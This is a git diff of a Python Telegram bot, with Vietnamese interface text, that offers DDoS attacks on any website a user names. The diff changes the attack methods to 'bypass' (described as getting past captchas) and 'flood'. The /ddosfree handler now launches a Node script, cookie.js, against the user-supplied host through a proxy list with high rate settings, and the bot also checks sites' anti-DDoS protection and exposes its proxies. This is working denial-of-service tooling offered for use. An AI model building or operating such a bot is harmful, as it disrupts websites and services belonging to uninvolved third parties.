@@ -138,7 +138,8 @@ def help(message):
 ┗━━━━━━━━━━━━━━➤
 - /check <link website> : Kiểm tra tính anti ddos của website ( Không hoàn toàn chính xác 100% )
 - /code <link website> : Để lấy mã code html của website
-- /proxy : Kiểm tra số proxy mà bot đang dùng
+- /proxy Kiểm tra số proxy mà bot đang dùng
+- /getproxy lấy proxy bot đang dùng
 - /time : Xem Thời Gian Mà BOT Đã Hoạt Động
 - /admin : Danh sách mạng xã hội của Admin
 '''
@@ -165,7 +166,7 @@ def aygspws(message):
 def methods(message):
     help_text = '''
 --- LAYER 7 ---
-HTTP
+BYPASS
 FLOOD
 '''
     bot.reply_to(message, help_text)
@@ -212,26 +213,18 @@ def ddos_command(message):
     host = message.text.split()[2] 
     username = message.from_user.username
 
-    # Biên dịch tệp Go trước khi chạy lệnh
-    try:
-        compile_command = ["go", "build", "-o", "schv1", "cm.go"]
-        subprocess.run(compile_command, check=True)
-    except subprocess.CalledProcessError:
-        bot.reply_to(message, "Có lỗi xảy ra")
-        return
-
     current_time = time.time()
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 10:
         remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
     
-    if method == "heta":
-        command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-heta", "-safe"]
-    elif method == "hetb":
-        command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-hetb", "-safe"]
+    if method == "bypass":
+        command = ["node cookie.js", host, "120", "100", "100", "proxy.txt"]
+    elif method == "flood":
+        command = ["node cookie.js", host, "120", "1000", "1000", "proxy.txt"]
     else:
-        bot.reply_to(message, 'Method không hợp lệ.\nCú pháp đúng: /ddosfree <method> <url>\nPhương pháp hỗ trợ:\n- heta : dùng proxy\n- hetb : Không dùng proxy')
+        bot.reply_to(message, 'Method không hợp lệ.\nCú pháp đúng: /ddosfree <method> <url>\nPhương pháp hỗ trợ:\n- bypass: vượt capcha\n- flood : tấn công lũ')
         return
 
     cooldown_dict[username] = {'attack': current_time}
